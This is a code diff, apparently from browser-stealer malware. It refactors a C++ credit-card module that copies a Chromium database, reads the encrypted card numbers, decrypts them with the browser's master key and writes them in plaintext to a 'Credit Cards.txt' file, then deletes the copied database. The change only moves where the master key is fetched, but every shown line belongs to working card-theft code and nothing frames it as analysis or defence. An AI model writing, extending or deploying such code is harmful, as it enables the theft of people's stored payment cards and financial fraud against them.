@@ -11,7 +11,7 @@ void CCreditCards::execute(const fs::path &root, const std::string &name, const 
     if(!exists(copied_db))
         return;
 
-    std::list<CreditCard> history = CCreditCards::getCreditCards(copied_db, this->getMasterKey());
+    std::list<CreditCard> history = this->getCreditCards(copied_db);
 
     fs::remove(copied_db);
 
@@ -32,7 +32,7 @@ void CCreditCards::execute(const fs::path &root, const std::string &name, const 
     Utils::writeFile(root / "Credit Cards.txt", ss.str());
 }
 
-std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path, const std::vector<BYTE> &master_key) {
+std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
     std::list<CreditCard> creditCardList;
     sqlite3* db;
     sqlite3_stmt* stmt;
@@ -68,6 +68,8 @@ std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path, cons
 
         std::vector<BYTE> card_number;
         card_number.assign(static_cast<const BYTE*>(card_number_encrypted), static_cast<const BYTE*>(card_number_encrypted) + card_number_size);
+
+        std::vector<BYTE> master_key = this->getMasterKey();
 
         std::string decoded_card_number = ChromiumUtil::decryptData(card_number, master_key);
         creditCardRecord.card_number = decoded_card_number;
